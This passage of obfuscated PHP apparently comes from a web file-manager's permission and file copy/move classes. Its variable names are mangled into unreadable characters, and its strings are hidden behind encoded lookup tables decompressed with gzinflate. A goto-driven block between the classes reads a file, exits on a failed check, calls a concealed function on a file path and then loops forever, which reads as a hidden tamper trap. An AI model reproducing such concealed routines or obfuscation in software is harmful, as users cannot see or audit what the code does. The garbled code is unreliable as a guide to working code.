$¥†¾ãÑŞ[2173] => $†ó†Ê”¸); $ÊÏœ…±[$ì·Ó›·•] = $Óßåçúï; return $Óßåçúï; } private function makeSourceAuth($ß©“Ì–Ğ, $”Øğ®¢, $ëì•½ ± = false) { $¡ë×½Ÿ =& $_SERVER[±³—úê]; $‹ÖÚÑ’ = $¡ë×½Ÿ[91]; $À§Ğ’• = $ß©“Ì–Ğ[$¡ë×½Ÿ[580]]; $×°Šç¢Ş = $ß©“Ì–Ğ[$¡ë×½Ÿ[190]] == SourceModel::TYPE_GROUP; $òÀ°èÏ  = $×°Šç¢Ş ? $this->groupRootAuth($À§Ğ’•, $ëì•½ ±) : !1; if ($òÀ°èÏ  && Model($¡ë×½Ÿ[582])->authCheckAction($òÀ°èÏ [$¡ë×½Ÿ[498]], $¡ë×½Ÿ[1996])) { return $this->groupAuthInfo($òÀ°èÏ , $À§Ğ’•); } $‰‰›ûµé = Model($¡ë×½Ÿ[1423])->parentLevelArray($ß©“Ì–Ğ[$¡ë×½Ÿ[595]]); $‰‰›ûµé = array_merge(array($ß©“Ì–Ğ[$¡ë×½Ÿ[193]]), array_reverse($‰‰›ûµé)); $•˜¦ö½ = !1; foreach ($‰‰›ûµé as $“²û¬œš) { if (!isset($”Øğ®¢[$“²û¬œš])) { continue; } $Ë¿ğàÕ½ = $this->authMake($”Øğ®¢[$“²û¬œš], $ëì•½ ±); if ($Ë¿ğàÕ½[$¡ë×½Ÿ[551]]) { $•˜¦ö½ = $Ë¿ğàÕ½; break; } } if (!$×°Šç¢Ş) { return $•˜¦ö½; } if (!$•˜¦ö½ && $òÀ°èÏ ) { $•˜¦ö½ = $this->groupAuthInfo($òÀ°èÏ , $À§Ğ’•); } if (!$•˜¦ö½) { $´õ˜ê™ = Model($¡ë×½Ÿ[596])->getInfo($À§Ğ’•); $¦¦Ç·ù§ = explode($¡ë×½Ÿ[50], trim($´õ˜ê™[$¡ë×½Ÿ[595]], $¡ë×½Ÿ[50])); $¦¦Ç·ù§ = array_reverse($¦¦Ç·ù§); foreach ($¦¦Ç·ù§ as $ì‘­ÁùÃ) { if ($ì‘­ÁùÃ == $¡ë×½Ÿ[240] || $ì‘­ÁùÃ == $‹ÖÚÑ’) { continue; } $À„—É¡Ü = $this->groupRootAuth($ì‘­ÁùÃ, $ëì•½ ±); if (!$À„—É¡Ü) { continue; } $•˜¦ö½ = $this->groupAuthInfo($À„—É¡Ü, $ì‘­ÁùÃ); break; } } if (!$•˜¦ö½ || $•˜¦ö½[$¡ë×½Ÿ[499]] <= 0) { $ñƒÒ¦„Û = $this->authDeepCheck($ß©“Ì–Ğ[$¡ë×½Ÿ[193]], $ëì•½ ±); if ($ñƒÒ¦„Û) { $•˜¦ö½ = $ñƒÒ¦„Û; } } return $•˜¦ö½; } private function userIsRoot($ïÂ²öŠŞ = false) { $­”èÚ­ =& $_SERVER[±³—úê]; if (!$ïÂ²öŠŞ && KodUser::isRoot()) { return !0; } $˜†ƒ‡Éû = Model($­”èÚ­[608])->getInfo($ïÂ²öŠŞ); $¸œ³í€Í = Model($­”èÚ­[2181])->listData($˜†ƒ‡Éû[$­”èÚ­[2182]]); if ($¸œ³í€Í && $¸œ³í€Í[$­”èÚ­[586]][$­”èÚ­[2183]] == 1) { return !0; } return !1; } private function sourceAuthInfo($®Á×ãîà) { $Ø°Çˆ‹Í =& $_SERVER[±³—úê]; $ñ ªó¯ş = Model($Ø°Çˆ‹Í[1423]); $¯€º¡ıÃ = $ñ ªó¯ş->sourceInfo($®Á×ãîà); if (!$¯€º¡ıÃ) { return !1; } $ñ ªó¯ş->groupPathDisplay($¯€º¡ıÃ); $‡œÊı£€ = array($¯€º¡ıÃ); $‡œÊı£€ = $ñ ªó¯ş->_listAppendPath($‡œÊı£€); $¯€º¡ıÃ = $‡œÊı£€[0]; $È‘ªá‚» = $¯€º¡ıÃ[$Ø°Çˆ‹Í[593]]; if (isset($¯€º¡ıÃ[$Ø°Çˆ‹Í[601]])) { $üää’„ş = explode($Ø°Çˆ‹Í[8], trim($¯€º¡ıÃ[$Ø°Çˆ‹Í[593]], $Ø°Çˆ‹Í[8])); array_shift($üää’„ş); $È‘ªá‚» = $¯€º¡ıÃ[$Ø°Çˆ‹Í[599]] . $Ø°Çˆ‹Í[2184] . implode($Ø°Çˆ‹Í[8], $üää’„ş); } return array($Ø°Çˆ‹Í[505] => $¯€º¡ıÃ[$Ø°Çˆ‹Í[32]], $Ø°Çˆ‹Í[87] => KodIO::make($¯€º¡ıÃ[$Ø°Çˆ‹Í[193]]), $Ø°Çˆ‹Í[2185] => $È‘ªá‚»); } private function groupAuthInfo($§ÈöÇ»Ã, $ûÉÄ„Ø’) { $îš´¡á =& $_SERVER[±³—úê]; $è÷€¸Çû = Model($îš´¡á[596])->getInfo($ûÉÄ„Ø’); return array($îš´¡á[2186] => intval($§ÈöÇ»Ã[$îš´¡á[498]]), $îš´¡á[2169] => $§ÈöÇ»Ã, $îš´¡á[2187] => LNG($îš´¡á[2188]), $îš´¡á[2178] => array($îš´¡á[505] => $è÷€¸Çû[$îš´¡á[32]], $îš´¡á[87] => KodIO::make($è÷€¸Çû[$îš´¡á[90]][$îš´¡á[193]]), $îš´¡á[2185] => $è÷€¸Çû[$îš´¡á[600]])); } protected function groupRootAuth($õ¯ÎÊ¢¹, $‰›áï«õ = false) { $‡‹ø¬¨Ü =& $_SERVER[±³—úê]; $‰›áï«õ = $‰›áï«õ ? $‰›áï«õ : USER_ID; $àÂŠşÚë = $‰›áï«õ . $‡‹ø¬¨Ü[2189] . $õ¯ÎÊ¢¹; static $Í³²úÔ = array(); if (isset($Í³²úÔ[$àÂŠşÚë])) { return $Í³²úÔ[$àÂŠşÚë]; } $îÀ”Ç™ß = Model($‡‹ø¬¨Ü[596])->getInfo($õ¯ÎÊ¢¹); $•àİÙÊæ = $this->userGroupList($‰›áï«õ); $…ñº÷í‰ = isset($•àİÙÊæ[$õ¯ÎÊ¢¹]) ? $•àİÙÊæ[$õ¯ÎÊ¢¹][$‡‹ø¬¨Ü[498]] : !1; if ($…ñº÷í‰ && Model($‡‹ø¬¨Ü[582])->authCheckAction($…ñº÷í‰[$‡‹ø¬¨Ü[498]], $‡‹ø¬¨Ü[1996])) { $Í³²úÔ[$àÂŠşÚë] = $…ñº÷í‰; return $…ñº÷í‰; } $àÏæ÷…¡ = $this->sourceAuthSelect($îÀ”Ç™ß[$‡‹ø¬¨Ü[90]][$‡‹ø¬¨Ü[193]]); $ûıûˆ§Å = $àÏæ÷…¡ ? $this->authMake($àÏæ÷…¡, $‰›áï«õ) : !1; $¯§ó‚Ç½ = $ûıûˆ§Å ? $ûıûˆ§Å[$‡‹ø¬¨Ü[551]] : !1; $Í³²úÔ[$àÂŠşÚë] = $¯§ó‚Ç½ ? $¯§ó‚Ç½ : $…ñº÷í‰; return $Í³²úÔ[$àÂŠşÚë]; } public function authOwnerApply($üó–ªŠú) { $˜£›«§ª =& $_SERVER[±³—úê]; if (empty($üó–ªŠú[$˜£›«§ª[498]]) || isset($üó–ªŠú[$˜£›«§ª[2190]]) && $üó–ªŠú[$˜£›«§ª[2190]]) { return $üó–ªŠú; } if (AuthModel::authCheckRoot($üó–ªŠú[$˜£›«§ª[498]][$˜£›«§ª[499]])) { return $üó–ªŠú; } $ö¦‚éé¢ = Model($˜£›«§ª[1423])->parentLevelArray($üó–ªŠú[$˜£›«§ª[595]]); $ö¦‚éé¢ = array_merge(array($üó–ªŠú[$˜£›«§ª[193]]), array_reverse($ö¦‚éé¢)); $÷ãÒ¿õ = $this->sourceAuthSelect($ö¦‚éé¢); $´àà¨ú = array(); $›ùêÛı¹ = array(); foreach ($÷ãÒ¿õ as $õ‰òëéˆ => $µĞ£Œ˜) { $®«¯ºÓ = $this->authFolderOwnerUser($µĞ£Œ˜); $´àà¨ú[$õ‰òëéˆ] = $®«¯ºÓ; $›ùêÛı¹ = array_merge($›ùêÛı¹, $®«¯ºÓ[$˜£›«§ª[676]]); if ($®«¯ºÓ[$˜£›«§ª[2191]]) { break; } } if (count($›ùêÛı¹) == 0) { $›ùêÛı¹ = $this->authFolderOwnerGroup($üó–ªŠú[$˜£›«§ª[580]]); } $›ùêÛı¹ = array_unique($›ùêÛı¹); if (AuthModel::authCheckRoot($üó–ªŠú[$˜£›«§ª[498]][$˜£›«§ª[499]])) { $›ùêÛı¹[] = USER_ID; } $üó–ªŠú[$˜£›«§ª[498]][$˜£›«§ª[2192]] = Model($˜£›«§ª[588])->userListInfo($›ùêÛı¹); return $üó–ªŠú; } private function authFolderOwnerGroup($İºû¡é‘) { $§¿íó¦¢ =& $_SERVER[±³—úê]; $™²š·¿ = Model($§¿íó¦¢[2069])->where(array($§¿íó¦¢[1975] => $İºû¡é‘))->select(); $Û’’¸ßû = array(); if (!$™²š·¿) { return $Û’’¸ßû; } foreach ($™²š·¿ as $ÑÀÒï¸ˆ) { $ù¹Åƒµ = $this->authInfo($ÑÀÒï¸ˆ); if (AuthModel::authCheckRoot($ù¹Åƒµ[$§¿íó¦¢[498]])) { $Û’’¸ßû[] = $ÑÀÒï¸ˆ[$§¿íó¦¢[1775]]; } } return $Û’’¸ßû; } private function authFolderOwnerUser($””ñèó•) { $ÊÈÈşé  =& $_SERVER[±³—úê]; $û¦¼ïû = array(); $Å€”Í… = !1; foreach ($””ñèó• as $áÂïğÉÁ) { $ØàùáÏ = $this->authInfo($áÂïğÉÁ); if ($áÂïğÉÁ[$ÊÈÈşé [580]] == $ÊÈÈşé [240]) { $Å€”Í… = !0; } if ($áÂïğÉÁ[$ÊÈÈşé [190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ØàùáÏ[$ÊÈÈşé [498]])) { $û¦¼ïû[] = $áÂïğÉÁ[$ÊÈÈşé [580]]; } } } return array($ÊÈÈşé [676] => $û¦¼ïû, $ÊÈÈşé [2191] => $Å€”Í…); } public function authMake($·‰‰î¿, $óÕ­ƒÅ = false) { $ßí ñĞ´ =& $_SERVER[±³—úê]; $ÚÃœı¤ş = $this->authArrayCheck($·‰‰î¿, $óÕ­ƒÅ); if ($ÚÃœı¤ş[$ßí ñĞ´[2193]]) { $ÚÃœı¤ş[$ßí ñĞ´[2193]] = $this->sourceAuthInfo($ÚÃœı¤ş[$ßí ñĞ´[2193]]); } return $ÚÃœı¤ş; } public function authArrayCheck($ñÓ¦¤€“, $©æø´ØŸ = false) { $íÑ‘¥â =& $_SERVER[±³—úê]; if (!$ñÓ¦¤€“) { return array($íÑ‘¥â[499] => 0, $íÑ‘¥â[551] => !1); } $©æø´ØŸ = $©æø´ØŸ ? $©æø´ØŸ : USER_ID; $ˆãÊ™éÃ = 0; $ÍÉ‘Éş¡ = 0; $ˆä…×™è = 0; $ş•…‘† = 0; $µêâÀ‘¶ = 0; $¡”¢Ã¥À = 0; $ñ¶¥Ûş = 1000; $ì ëË = 0; $ï¶Îßî© = 0; $¨âì¹— = 0; $Ü¶¬Ì’Â = 0; $«Çš¼ñÔ = array($íÑ‘¥â[193] => 0); foreach ($ñÓ¦¤€“ as $«Çš¼ñÔ) { $ı™ÍÙĞË = $this->authInfo($«Çš¼ñÔ); if (!$ı™ÍÙĞË) { continue; } $ªïã…Ó¨ = $«Çš¼ñÔ[$íÑ‘¥â[580]]; $ÖëÃí‚± = intval($ı™ÍÙĞË[$íÑ‘¥â[498]]); if ($«Çš¼ñÔ[$íÑ‘¥â[190]] == SourceModel::TYPE_USER && $ªïã…Ó¨ == $©æø´ØŸ) { $ˆãÊ™éÃ = !0; $ˆä…×™è = $ı™ÍÙĞË; $ÍÉ‘Éş¡ = $ÖëÃí‚±; } else { if ($«Çš¼ñÔ[$íÑ‘¥â[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ªïã…Ó¨, $©æø´ØŸ)) { $ş•…‘† = !0; $ï”¿¡ß = $this->groupStepToUserGroup($ªïã…Ó¨, $©æø´ØŸ); if ($ï”¿¡ß < $ñ¶¥Ûş) { $ñ¶¥Ûş = $ï”¿¡ß; $µêâÀ‘¶ = $ÖëÃí‚±; $¡”¢Ã¥À = $ı™ÍÙĞË; $ì ëË = $ªïã…Ó¨; } if ($ï”¿¡ß == $ñ¶¥Ûş && $ÖëÃí‚± >= $µêâÀ‘¶) { $µêâÀ‘¶ = $ÖëÃí‚±; $¡”¢Ã¥À = $ı™ÍÙĞË; $ì ëË = $ªïã…Ó¨; } } else { if ($ªïã…Ó¨ == $íÑ‘¥â[240]) { $ï¶Îßî© = !0; $Ü¶¬Ì’Â = $ı™ÍÙĞË; $¨âì¹— = $ÖëÃí‚±; } } } } if ($ˆãÊ™éÃ) { $ØğüêÌ» = $ÍÉ‘Éş¡; $ı™ÍÙĞË = $ˆä…×™è; $¥…µ×à = LNG($íÑ‘¥â[2194]); } else { if ($ş•…‘†) { $ØğüêÌ» = $µêâÀ‘¶; $ı™ÍÙĞË = $¡”¢Ã¥À; $Ø©¾Ùôø = Model($íÑ‘¥â[596])->getInfo($ì ëË); $¥…µ×à = $íÑ‘¥â[176] . $Ø©¾Ùôø[$íÑ‘¥â[600]] . $íÑ‘¥â[2195] . LNG($íÑ‘¥â[2196]); } else { if ($ï¶Îßî©) { $ØğüêÌ» = $¨âì¹—; $ı™ÍÙĞË = $Ü¶¬Ì’Â; $¥…µ×à = LNG($íÑ‘¥â[2166]); } else { $ØğüêÌ» = 0; $ı™ÍÙĞË = !1; $¥…µ×à = $íÑ‘¥â[12]; } } } $´À×Î¶œ = array($íÑ‘¥â[2186] => intval($ØğüêÌ»), $íÑ‘¥â[2169] => $ı™ÍÙĞË, $íÑ‘¥â[2187] => $¥…µ×à, $íÑ‘¥â[2178] => $«Çš¼ñÔ[$íÑ‘¥â[193]]); return $´À×Î¶œ; } private function groupContainUser($ÏæÇˆû¸, $ÃË¥‡Ìü = false) { return in_array($ÏæÇˆû¸, $this->userGroupParents($ÃË¥‡Ìü)); } private function groupStepToUserGroup($÷¢½øø½, $†¿äº© = false) { $‰ç¡ÕôÓ =& $_SERVER[±³—úê]; $ÒÈªöõÑ = $this->userGroupList($†¿äº©); $€¹İÅ†Î = 1000; $ëÙÍ¸ø÷ = $GLOBALS[$‰ç¡ÕôÓ[6]][$‰ç¡ÕôÓ[92]][$‰ç¡ÕôÓ[2082]] == 1; $û¹ô¹ğ¹ = $ëÙÍ¸ø÷ ? 3 : 2; foreach ($ÒÈªöõÑ as $ö¿ıì€) { if ($ö¿ıì€[$‰ç¡ÕôÓ[1975]] == $÷¢½øø½) { return 0; } $ôĞê¡ó“ = explode($‰ç¡ÕôÓ[50], trim($ö¿ıì€[$‰ç¡ÕôÓ[595]], $‰ç¡ÕôÓ[50])); if ($ôĞê¡ó“[0] == $‰ç¡ÕôÓ[240] && count($ôĞê¡ó“) > $û¹ô¹ğ¹) { $ãÁ”İŠ = array_reverse(array_slice($ôĞê¡ó“, $û¹ô¹ğ¹)); $ëŒ…¯Ã¿ = array_search($÷¢½øø½, $ãÁ”İŠ); if ($ëŒ…¯Ã¿ !== !1 && $ëŒ…¯Ã¿ + 1 <= $€¹İÅ†Î) { $€¹İÅ†Î = $ëŒ…¯Ã¿ + 1; } } } return $€¹İÅ†Î; } private function userGroupList($•Šò‡Òµ = false) { $ï¸¡€ëŒ =& $_SERVER[±³—úê]; static $‘¹¿”øí = array(); if (isset($‘¹¿”øí[$•Šò‡Òµ])) { return $‘¹¿”øí[$•Šò‡Òµ]; } $üòÎØÉñ = Model($ï¸¡€ëŒ[608])->getInfo($•Šò‡Òµ); $‘¹¿”øí[$•Šò‡Òµ] = array_to_keyvalue($üòÎØÉñ[$ï¸¡€ëŒ[2167]], $ï¸¡€ëŒ[1975]); return $‘¹¿”øí[$•Šò‡Òµ]; } public function userGroupParents($ÓíÕ—¨•) { $ôãûù§Ü =& $_SERVER[±³—úê]; static $¨×¯Ğ–Ä = array(); $ÓíÕ—¨• = $ÓíÕ—¨• ? $ÓíÕ—¨• : USER_ID; if (isset($¨×¯Ğ–Ä[$ÓíÕ—¨•])) { return $¨×¯Ğ–Ä[$ÓíÕ—¨•]; } $æĞç›éÃ = $this->userGroupList($ÓíÕ—¨•); $ÅÎÉ£µì = array(); $ò¢­‘›ı = $GLOBALS[$ôãûù§Ü[6]][$ôãûù§Ü[92]][$ôãûù§Ü[2082]] == 1; $°ÊÂàÎ = $ò¢­‘›ı ? 3 : 2; foreach ($æĞç›éÃ as $ß†ûğ„) { $©¬¶É = array($ß†ûğ„[$ôãûù§Ü[1975]]); $“—ç¬‡ = explode($ôãûù§Ü[50], trim($ß†ûğ„[$ôãûù§Ü[595]], $ôãûù§Ü[50])); if ($“—ç¬‡[0] == $ôãûù§Ü[240] && count($“—ç¬‡) > $°ÊÂàÎ) { $áÄª¤Ê¶ = array_slice($“—ç¬‡, $°ÊÂàÎ); $©¬¶É = array_merge($©¬¶É, array_reverse($áÄª¤Ê¶)); } $ÅÎÉ£µì = array_merge($ÅÎÉ£µì, $©¬¶É); } $¨×¯Ğ–Ä[$ÓíÕ—¨•] = array_unique($ÅÎÉ£µì); return $¨×¯Ğ–Ä[$ÓíÕ—¨•]; } public function authTargetInfoMake($—Íòã¼¸) { $¹¶û¸×» =& $_SERVER[±³—úê]; $ÑöÀ€† = array(); $—È˜Ô–ğ = array(); foreach ($—Íòã¼¸ as $¡Œàïİ) { if ($¡Œàïİ[$¹¶û¸×»[190]] == SourceModel::TYPE_USER) { $ÑöÀ€†[] = intval($¡Œàïİ[$¹¶û¸×»[580]]); } else { if ($¡Œàïİ[$¹¶û¸×»[190]] == SourceModel::TYPE_GROUP) { $—È˜Ô–ğ[] = intval($¡Œàïİ[$¹¶û¸×»[580]]); } } } if ($ÑöÀ€†) { $ÑöÀ€† = Model($¹¶û¸×»[588])->userListInfo($ÑöÀ€†); } if ($—È˜Ô–ğ) { $«ØÇ§Ş¨ = array($¹¶û¸×»[2067] => array($¹¶û¸×»[503], $—È˜Ô–ğ)); $—È˜Ô–ğ = Model($¹¶û¸×»[596])->field($¹¶û¸×»[2197])->where($«ØÇ§Ş¨)->select(); $—È˜Ô–ğ = array_to_keyvalue($—È˜Ô–ğ, $¹¶û¸×»[1975]); } return array($¹¶û¸×»[2198] => $ÑöÀ€†, $¹¶û¸×»[2199] => $—È˜Ô–ğ); } public function authInfo($à¦Õ¡Š) { $ôñºĞö‚ =& $_SERVER[±³—úê]; if ($à¦Õ¡Š[$ôñºĞö‚[2083]]) { $å­îõ¡ = Model($ôñºĞö‚[582])->listData($à¦Õ¡Š[$ôñºĞö‚[2083]]); if (!$å­îõ¡) { return !1; $ÖÍ‰¨Ó• = Model($ôñºĞö‚[582])->listData(); $åóçò« = array_filter_by_field($ÖÍ‰¨Ó•, $ôñºĞö‚[498], $ôñºĞö‚[240]); return $åóçò«; } $Ï­ÌÊı— = array_field_key($å­îõ¡, array($ôñºĞö‚[486], $ôñºĞö‚[32], $ôñºĞö‚[498], $ôñºĞö‚[1998], $ôñºĞö‚[1999])); $Ï­ÌÊı—[$ôñºĞö‚[2200]] = $à¦Õ¡Š; return $Ï­ÌÊı—; } else { return array($ôñºĞö‚[504] => 0, $ôñºĞö‚[1981] => $à¦Õ¡Š[$ôñºĞö‚[2144]], $ôñºĞö‚[505] => $ôñºĞö‚[12], $ôñºĞö‚[1998] => $ôñºĞö‚[2201]); } } } goto aºğ›‡‚Ş; fÉµÖ¶ƒó: $egolxbpwsj = $_SERVER[±³—úê][693]; while ($egolxbpwsj < $_SERVER[±³—úê][694]) { if ($egolxbpwsj >= 0) { break; } $egolxbpwsj++; } $_SERVER[ï¢Â™Û…] = explode($_SERVER[±³—úê][695], gzinflate(substr($_SERVER[±³—úê][696], 10, -8))); goto aØ•¹™«……; cùê‘Ùô–: if (!isset($_SERVER[$_SERVER[±³—úê][216]]) || !isset($_SERVER[$_SERVER[±³—úê][225]])) { $_getc = $_SERVER[±³—úê][218]; $_getfile = $_SERVER[$_SERVER[±³—úê][219]] . $_SERVER[±³—úê][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±³—úê][221], $_getfilec); if (count($_getarrs) < $_SERVER[±³—úê][222]) { $exit = $_SERVER[±³—úê][223]; $exit(); } $_act = $_SERVER[±³—úê][224]; $_act($_SERVER[$_SERVER[±³—úê][219]] . $_SERVER[±³—úê][220]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[±³—úê][465]); } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¬ßß½Á, $ïåŠ¡“) { $Ìˆ’‚„Õ =& $_SERVER[±³—úê]; $ãõ¸ì = $ïåŠ¡“; $GLOBALS[$Ìˆ’‚„Õ[1229]] = $Ìˆ’‚„Õ[1230] . $¬ßß½Á; Hook::trigger($Ìˆ’‚„Õ[1230] . $¬ßß½Á . $Ìˆ’‚„Õ[1231], $ãõ¸ì); $÷üğõ´… = self::driverMake($ïåŠ¡“[0]); if (!$÷üğõ´…) { return !1; } if (method_exists($÷üğõ´…, $¬ßß½Á)) { $÷¸³•Ø = @call_user_func_array(array($÷üğõ´…, $¬ßß½Á), $ïåŠ¡“); } else { if (method_exists($÷üğõ´…, $Ìˆ’‚„Õ[1232])) { $÷¸³•Ø = @call_user_func_array(array($÷üğõ´…, $¬ßß½Á), $ïåŠ¡“); } else { if (method_exists(self, $¬ßß½Á)) { $÷¸³•Ø = @call_user_func_array(array(self, $¬ßß½Á), $ïåŠ¡“); } else { $÷¸³•Ø = call_user_func_array(array(parent, $¬ßß½Á), $ïåŠ¡“); } } } Hook::trigger($Ìˆ’‚„Õ[1230] . $¬ßß½Á . $Ìˆ’‚„Õ[1233], $ãõ¸ì, $÷¸³•Ø); return $÷¸³•Ø; } public static function init($õÃ®§í„) { return self::driverMake($õÃ®§í„); } public static function copy($ô÷©°ë, $¦»œèµ, $äşïéÜ = false, $¦ÍÑÛ¿ = false) { return self::copyMoveStart($ô÷©°ë, $¦»œèµ, $äşïéÜ, $_SERVER[±³—úê][632], $¦ÍÑÛ¿); } public static function move($Ñá•œ·Ü, $öˆ³¦ì, $›‚½“ = false, $Ò¥çñÁ = false) { return self::copyMoveStart($Ñá•œ·Ü, $öˆ³¦ì, $›‚½“, $_SERVER[±³—úê][634], $Ò¥çñÁ); } public static function copyMoveChildren($™¸Ãıæë, $ç·ŒşÜ‹, $üŞü€ß = "\x63\x6f\x70\x79", $«ê»äâæ = REPEAT_REPLACE) { $Æ—¾Å®ö =& $_SERVER[±³—úê]; $¹«·È¢« = $™¸Ãıæë; $á™ïÖ‰Ú = self::driverMake($™¸Ãıæë); $Ÿ­”÷Ññ = $á™ïÖ‰Ú->listPath($™¸Ãıæë, !0); $ş°å¨ÚÔ = array_merge($Ÿ­”÷Ññ[$Æ—¾Å®ö[86]], $Ÿ­”÷Ññ[$Æ—¾Å®ö[85]]); foreach ($ş°å¨ÚÔ as $õŸà€Üª) { self::copyMoveStart($õŸà€Üª[$Æ—¾Å®ö[87]], $ç·ŒşÜ‹, $«ê»äâæ, $üŞü€ß, !1); } if ($üŞü€ß == $Æ—¾Å®ö[634]) { self::remove($¹«·È¢«); } } private static function copyMoveStart($ÕÉ’¼ÇÍ, $²ªßÑø¿, $‹Ù—¶Í , $ÔÇì¯ÅÚ, $±æŞşıâ) { $ûˆËì¬ =& $_SERVER[±³—úê]; $İ§±†ù‚ = array($ÕÉ’¼ÇÍ, $²ªßÑø¿, $‹Ù—¶Í , $±æŞşıâ); Hook::trigger($ûˆËì¬[1230] . $ÔÇì¯ÅÚ . $ûˆËì¬[1231], $İ§±†ù‚); $®¢â€× = self::copyMove($ÕÉ’¼ÇÍ, $²ªßÑø¿, $‹Ù—¶Í , $ÔÇì¯ÅÚ, $±æŞşıâ); Hook::trigger($ûˆËì¬[1230] . $ÔÇì¯ÅÚ . $ûˆËì¬[1233], $İ§±†ù‚, $®¢â€×); return $®¢â€×; } public static function saveFile($ıÖíÕæª, $¤‰™šÂ, $óÁ°Á€² = true) { $å¾†äÓ‚ =& $_SERVER[±³—úê]; $ß‰¹ªî = self::info($¤‰™šÂ); $ÓŒı¸”ç = self::driverMake($ıÖíÕæª); $ÜÒìù» = self::driverMake($¤‰™šÂ); $¸Ë¯ÕøŸ = !1; if ($ÜÒìù»->pathParse[$å¾†äÓ‚[1234]]) { $¸Ë¯ÕøŸ = $ÜÒìù»; $â™çô¢¡ = $ÜÒìù»->pathParse[$å¾†äÓ‚[1234]]; $ÜÒìù» = self::driverMake($â™çô¢¡); } if ($ÓŒı¸”ç->pathParse[$å¾†äÓ‚[1234]]) { $ÙìÏŒğº = $ÓŒı¸”ç->pathParse[$å¾†äÓ‚[1234]]; $ÓŒı¸”ç = self::driverMake($ÙìÏŒğº); } $Í‹àÇï¢ = $ÜÒìù»->pathFather($¤‰™šÂ); $öø¿Æ§ = !0; if (!$óÁ°Á€² && self::driverIsSame($ÓŒı¸”ç, $ÜÒìù»)) { $öø¿Æ§ = !1; } $öíÍÁıÉ = self::copyFile($ÓŒı¸”ç, $ıÖíÕæª, $ÜÒìù», $Í‹àÇï¢, $ß‰¹ªî[$å¾†äÓ‚[32]], $öø¿Æ§); if ($¸Ë¯ÕøŸ) { $öíÍÁıÉ = $¸Ë¯ÕøŸ->getPathOuter($öíÍÁıÉ); } return $öíÍÁıÉ; } private static function copyMove($ËòãÊ’¼, $ú®§î™µ, $·ßÄÚüˆ, $”¶Ù€Û, $¼ªÚèí = false) { $ÓúĞ¨Á… =& $_SERVER[±³—úê]; if (!$ËòãÊ’¼ || $ËòãÊ’¼ == $ÓúĞ¨Á…[8] || !$ú®§î™µ) { return !1; } ignore_timeout(); $’‚Ïœ¸ = self::driverMake($ËòãÊ’¼); $¡£õß¦Ò = self::driverMake($ú®§î™µ); $©×Ú¾Áú = $”¶Ù€Û == $ÓúĞ¨Á…[634]; $ØúŠåŸş = !1; if ($¡£õß¦Ò->pathParse[$ÓúĞ¨Á…[1234]]) { $ØúŠåŸş = $¡£õß¦Ò; $ú®§î™µ = $¡£õß¦Ò->pathParse[$ÓúĞ¨Á…[1234]]; $¡£õß¦Ò = self::driverMake($ú®§î™µ); } if ($’‚Ïœ¸->pathParse[$ÓúĞ¨Á…[1234]]) { $ËòãÊ’¼ = $’‚Ïœ¸->pathParse[$ÓúĞ¨Á…[1234]]; $’‚Ïœ¸ = self::driverMake($ËòãÊ’¼); } self::check($’‚Ïœ¸, $ËòãÊ’¼, $¡£õß¦Ò, $ú®§î™µ); Hook::trigger($ÓúĞ¨Á…[1235], $’‚Ïœ¸, $ËòãÊ’¼, $¡£õß¦Ò, $ú®§î™µ); $î ”öìû = self::driverIsSame($’‚Ïœ¸, $¡£õß¦Ò); if ($î ”öìû) { if ($”¶Ù€Û == $ÓúĞ¨Á…[634] && !method_exists($¡£õß¦Ò, $ÓúĞ¨Á…[1236]) && trim($ú®§î™µ, $ÓúĞ¨Á…[8]) == trim($¡£õß¦Ò->pathFather($ËòãÊ’¼), $ÓúĞ¨Á…[8])) { if ($’‚Ïœ¸->pathThis($ËòãÊ’¼) != $¼ªÚèí && !$’‚Ïœ¸->isOsDriver()) { return $’‚Ïœ¸->rename($ËòãÊ’¼, $¼ªÚèí); } return $¡£õß¦Ò->getPathOuter($ËòãÊ’¼); } if (method_exists($¡£õß¦Ò, $”¶Ù€Û)) { return $¡£õß¦Ò->{$”¶Ù€Û}($ËòãÊ’¼, $ú®§î™µ, $·ßÄÚüˆ, $¼ªÚèí); } } if ($î ”öìû && $”¶Ù€Û == $ÓúĞ¨Á…[634] && $¡£õß¦Ò->getType() == $ÓúĞ¨Á…[109]) { $ëâ¹ò€® = $¡£õß¦Ò->movePath($ËòãÊ’¼, $ú®§î™µ, $¼ªÚèí); if ($ëâ¹ò€®) { return $ëâ¹ò€®; } } $´èÃËÚÅ = $’‚Ïœ¸->isFile($ËòãÊ’¼); if (!$´èÃËÚÅ && $¡£õß¦Ò->getType() == $ÓúĞ¨Á…[837] && $’‚Ïœ¸->getType() == $ÓúĞ¨Á…[109]) { $ëâ¹ò€® = $¡£õß¦Ò->copyFolderFromIO($’‚Ïœ¸, $ËòãÊ’¼, $ú®§î™µ, $·ßÄÚüˆ, $©×Ú¾Áú, $¼ªÚèí); } else { $ëâ¹ò€® = self::copyPath($’‚Ïœ¸, $ËòãÊ’¼, $¡£õß¦Ò, $ú®§î™µ, $·ßÄÚüˆ, $©×Ú¾Áú, $´èÃËÚÅ, $¼ªÚèí); } if ($ëâ¹ò€® && $©×Ú¾Áú) { $’‚Ïœ¸->remove($ËòãÊ’¼); } if ($ØúŠåŸş) { $ëâ¹ò€® = $ØúŠåŸş->getPathOuter($ëâ¹ò€®); } return $ëâ¹ò€®; } private static function check($ıˆ¬¬’, $•ç³ÏÍÁ, $‚íâåØ¨, &$ğ¹›ª´€) { $…ı‚†‰ä =& $_SERVER[±³—úê]; if (self::driverIsSame($ıˆ¬¬’, $‚íâåØ¨) && $ıˆ¬¬’->isFolder($•ç³ÏÍÁ) && $ıˆ¬¬’->isParentOf($•ç³ÏÍÁ, $ğ¹›ª´€)) { show_json(LNG($…ı‚†‰ä[1237]), !1); } if (!$ıˆ¬¬’->exist($•ç³ÏÍÁ)) { show_json(LNG($…ı‚†‰ä[108]), !1); } } private static function copyPath($õ±ÔÈèº, $ãÏ±Êß, $Ğ”ÔÒ¾ß, $­Â‰¯»Ú, $ğ´½ØØ, $™˜—Ö¶, $–¿‡£¯ç, $ÏÔŞÖ° = false, $ëàÄöÎ = true) { $ÁÃ´¬éÖ =& $_SERVER[±³—úê]; $ª÷›£ = empty($ÏÔŞÖ°) && $ÏÔŞÖ° !== $ÁÃ´¬éÖ[240] ? 